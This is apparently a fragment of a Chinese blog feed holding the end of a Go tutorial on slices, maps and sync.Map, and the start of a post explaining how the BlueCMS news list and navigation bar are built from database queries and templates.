punctuation">}</span>    s1 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">//[0 1 2]</span>    s2 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">//[3 4]</span>    s1 <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1 2 5]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1 2 5 4],本质是底层数组被修改</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[5 4]</span><span class="token punctuation">}</span></code></pre></li><li><p>在切片的容量不足时，切片会进行扩容，即生成一个新的底层数组。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span>    s1 <span class="token operator">:=</span> arr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//5 5</span>    s1 <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//6 10。进行了扩容，容量为原来的2倍</span>    arr<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4444</span> <span class="token comment" spellcheck="true">//修改原数组，[0 1 2 3 4444]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 1 2 3 4 5]。原数组的修改不再影响切片，因为此时切片引用的不再是原数组。</span><span class="token punctuation">}</span></code></pre></li><li><p>切片只能是数组的连续片段进行引用，不能断开。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    arr <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">}</span>    s1 <span class="token operator">:=</span> <span class="token function">append</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[0,1,4]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[0 1 4 4]，底层数组被修改覆盖</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>几点总结：</strong></p><ol><li>每个切片会指向一个底层数组，这个数组能容纳一定数量的元素。当底层数组不能容纳新增的元素时，切片就会自动按照一定的策略进行“扩容”（前一次容量的2倍），此时该切片指向的底层数组就会更换，即产生新的底层数组，因此当发生扩容时，切片的地址也会改变（新的底层数组地址改变，切片指向的地址自然跟随新数组改变）。</li><li>append（）函数的返回值是更新后的切片，用返回值赋值给切片变量实现更改切片的操作，之所以要用返回的切片对原切片进行更新，而不像Python中列表那样的原处修改，是因为更新的切片地址、容量可能发生改变了（扩容产生了新数组）。</li><li>在前面追加元素都会发生切片地址改变，因此开销要比在后面追加大。</li></ol></li></ul></li><li><p><strong>切片元素删除</strong></p><ul><li>要从切片a中删除索引为index的元素，操作方法是 <code>a = append(a[:index], a[index+1:]...)</code></li></ul></li><li><p><strong>遍历切片</strong></p><pre class=" language-go"><code class="language-go">test <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"Aqua"</span><span class="token punctuation">,</span> <span class="token string">"Mikasa"</span><span class="token punctuation">,</span> <span class="token string">"Yuihama"</span><span class="token punctuation">,</span> <span class="token string">"Touka"</span><span class="token punctuation">,</span> <span class="token string">"Tosaki"</span><span class="token punctuation">}</span><span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> test <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Index：%d ; Value：%s \n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>切片排序：</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    s1 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span>    sort<span class="token punctuation">.</span><span class="token function">Ints</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>    s2 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">}</span>    sort<span class="token punctuation">.</span><span class="token function">Strings</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[0 1 2 4 5 6 7 8]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[a b c d]</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x06-多维切片"><a href="#0x06-多维切片" class="headerlink" title="0x06 多维切片"></a>0x06 多维切片</h5><pre class=" language-go"><code class="language-go">test <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">"Aqua"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"Mikasa"</span><span class="token punctuation">,</span> <span class="token string">"Yuihama"</span><span class="token punctuation">}</span><span class="token punctuation">}</span>test<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>test<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Tosaki"</span><span class="token punctuation">)</span>                fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>test<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> test<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> test<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="三、映射（Map）"><a href="#三、映射（Map）" class="headerlink" title="三、映射（Map）"></a>三、映射（Map）</h2><ul><li>Go语言的<code>map</code>是一种以键值对方式存储的无序集合数据结构，类似于Python中的字典。</li><li>Go语言的<code>map</code>是引用类型，不需要指明长度，是可以动态增长的。</li><li>未显式初始化的<code>map</code>，默认使用零值nil进行初始化。</li></ul><h5 id="0x00-map声明及初始化"><a href="#0x00-map声明及初始化" class="headerlink" title="0x00 map声明及初始化"></a>0x00 map声明及初始化</h5><blockquote><p>var test map[KeyType]ValueType</p></blockquote><ul><li>key 可以是<code>string</code>、<code>int</code>、<code>float</code>。数组、切片和结构体不能作为 key，但是指针和接口类型可以；</li><li>value可以是任意类型。</li></ul><pre class=" language-go"><code class="language-go">test <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token string">"mikasa"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Aqua"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"Yuigahama"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">//声明并初始化</span>test <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//不显式初始化时，使用nil进行初始化。</span>test <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//使用make函数构造map，分配内存。</span>test<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Mikasa"</span>               <span class="token comment" spellcheck="true">//新增一个元素</span>test<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Yuigahama"</span>test <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>，<span class="token punctuation">[</span><span class="token builtin">cap</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//map值为切片类型,cap为容量大小，不是必需的。</span>test<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"Mikasa"</span><span class="token punctuation">}</span>test<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"Yuigahama"</span><span class="token punctuation">}</span></code></pre><h5 id="0x01-映射特性"><a href="#0x01-映射特性" class="headerlink" title="0x01 映射特性"></a>0x01 映射特性</h5><ul><li><p>将一个<code>map</code>赋值给另一个变量，与切片一样，是引用，它们的元素都引用于同一对象。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    m1 <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">}</span>    m2 <span class="token operator">:=</span> m1    m1<span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">22</span>    <span class="token comment" spellcheck="true">//改变m1</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//map[a:1 b:22 c:3 d:4]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//map[a:1 b:22 c:3 d:4]，m1改变导致m2也改变</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x02-映射操作"><a href="#0x02-映射操作" class="headerlink" title="0x02 映射操作"></a>0x02 映射操作</h5><ul><li><p>遍历map</p><pre class=" language-go"><code class="language-go">test <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"Mikasa"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"Yuigahama"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"Toka"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"Tosaki"</span><span class="token punctuation">}</span><span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> test <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> test<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//test[k]与v都可得到值。</span><span class="token punctuation">}</span></code></pre></li><li><p>删除map中某个键值对：<code>delete(map,key)</code></p><pre class=" language-go"><code class="language-go">test <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"Mikasa"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"Yuigahama"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"Toka"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"Tosaki"</span><span class="token punctuation">}</span><span class="token function">delete</span><span class="token punctuation">(</span>test<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//删除test中key为1的键值对。</span></code></pre></li><li><p>判断key是否存在</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    m1 <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">}</span>    value<span class="token punctuation">,</span> ok <span class="token operator">:=</span> m1<span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"key doesnt exist"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//1</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="0x03-sync-Map"><a href="#0x03-sync-Map" class="headerlink" title="0x03 sync.Map"></a>0x03 sync.Map</h5><ul><li><p>在并发情况下，同时对一个map进行读写会造成线程不安全，Go会检测到并报错。</p></li><li><p><code>sync.Map</code>是一种线程安全的map,但是与原生的map有很大不同：</p><ul><li>无须初始化，直接声明即可。</li><li><code>sync.Map</code> 不能使用 map 的方式进行取值和设置等操作，而是使用 <code>sync.Map</code> 的方法进行调用：<ul><li>Store   表示存储</li><li>Load    表示获取</li><li>Delete  表示删除</li></ul></li></ul></li><li><p>使用 Range 配合一个回调函数进行遍历操作，通过回调函数返回内部遍历出来的值。</p></li></ul><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> info sync<span class="token punctuation">.</span>Map    info<span class="token punctuation">.</span><span class="token function">Store</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"Mikasa"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//存储键值</span>    info<span class="token punctuation">.</span><span class="token function">Store</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>    info<span class="token punctuation">.</span><span class="token function">Store</span><span class="token punctuation">(</span><span class="token string">"gender"</span><span class="token punctuation">,</span> <span class="token string">"female"</span><span class="token punctuation">)</span>    info<span class="token punctuation">.</span><span class="token function">Store</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span>    value<span class="token punctuation">,</span> ok <span class="token operator">:=</span> info<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//取值</span>    <span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"No key"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    info<span class="token punctuation">.</span><span class="token function">Delete</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除</span>    <span class="token comment" spellcheck="true">//遍历键值</span>    info<span class="token punctuation">.</span><span class="token function">Range</span><span class="token punctuation">(</span><span class="token keyword">func</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v <span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="四、注意事项总结"><a href="#四、注意事项总结" class="headerlink" title="四、注意事项总结"></a>四、注意事项总结</h2><h5 id="0x00-引用类型要分配内存才可使用"><a href="#0x00-引用类型要分配内存才可使用" class="headerlink" title="0x00 引用类型要分配内存才可使用"></a>0x00 引用类型要分配内存才可使用</h5><ul><li><p>下面的代码会引发<code>panic</code>,在Go语言中对于引用类型的变量，我们在使用的时候不仅要声明它，还要为它分配内存空间，否则我们的值就没办法存储。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token punctuation">(</span>        s1 <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>        m1 <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">int</span>    <span class="token punctuation">)</span>    s1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>      <span class="token comment" spellcheck="true">//error: index out of range</span>    m1<span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token comment" spellcheck="true">//panic: assignment to entry in nil map</span><span class="token punctuation">}</span></code></pre><ul><li><p><strong>引用类型分配内存的两种方式</strong></p><ul><li><p>声明同时初始化会发生内存分配。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    s <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span>    m <span class="token operator">:=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"Aqua"</span><span class="token punctuation">}</span>    s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>    m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Mikasa"</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 2]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//map[0:Aqua 1:Mikasa]</span><span class="token punctuation">}</span></code></pre></li><li><p>若不想在声明时进行初始化，则需要使用<code>make()</code>函数分配内存，会使用对应的0值进行初始化。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    s <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>    m <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//[0 0 0 0]</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//map[]</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li><li><p>值类型声明即可使用，因为值类型在声明的时候已经默认分配好了内存空间。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> test <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token builtin">int</span>    test<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//[0 2 0 0]</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BlueCMS功能点实现代码逻辑</title>
      <link href="2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/"/>
      <url>2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h2 id="新闻列表"><a href="#新闻列表" class="headerlink" title="新闻列表"></a>新闻列表</h2><p>如下图，首页上的新闻列表。</p><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/image-20200923095406406.png" alt="image-20200923095406406" style="zoom:50%;"><p><strong>实现逻辑</strong></p><blockquote><p>从存放新闻的数据库表中获取数据，上图不同的框注的部分实际只是在进行SQL查询时，语句过滤的条件不同而已。之后将查询到的所有新闻数据传给模板语言，模板语言循环传入的数据并渲染显示内容（文章URL、文章标题）。</p></blockquote><p>每篇文章一般会使用不同的<code>id</code>参数标识。形如：<code>news.php?id=1</code></p><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/image-20200923105348921.png" alt="image-20200923105348921" style="zoom:50%;"><p>存放新闻的数据表:</p><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/image-20200923100515760.png" alt="image-20200923100515760" style="zoom: 40%;"><p>查询数据并传给模板语言：</p><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/image-20200923100758860.png" alt="image-20200923100758860" style="zoom:50%;"><p>模板循环数据进行渲染：</p><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/image-20200923101019763.png" alt="image-20200923101019763" style="zoom: 50%;"><h5 id="文章分类页"><a href="#文章分类页" class="headerlink" title="文章分类页"></a><strong>文章分类页</strong></h5><p>文章分类页同理，只不过是根据文章表的<code>cid</code>字段，即分类字段进行过滤查询结果。</p><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/image-20200923111410133.png" alt="image-20200923111410133" style="zoom:40%;"><h2 id="导航条"><a href="#导航条" class="headerlink" title="导航条"></a>导航条</h2><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/image-20200923112411381.png" alt="image-20200923112411381" style="zoom:50%;"><p><strong>实现逻辑</strong></p><blockquote><p>将导航条各个菜单项的信息存储到数据库的一个表中，在显示页面时将其从数据库中读出传给模板引擎进行渲染。</p></blockquote><p>存放菜单项的数据表：</p><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/image-20200923113839727.png" alt="image-20200923113839727" style="zoom:50%;"><p>从数据库中查询：</p><img src="/2020/09/23/BlueCMS%E5%8A%9F%E8%83%BD%E7%82%B9%E5%AE%9E%E7%8E%B0%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91/Untitled.png" alt="img" style="zoom:40%;"><p>传到页面进行渲染显示：</p><img 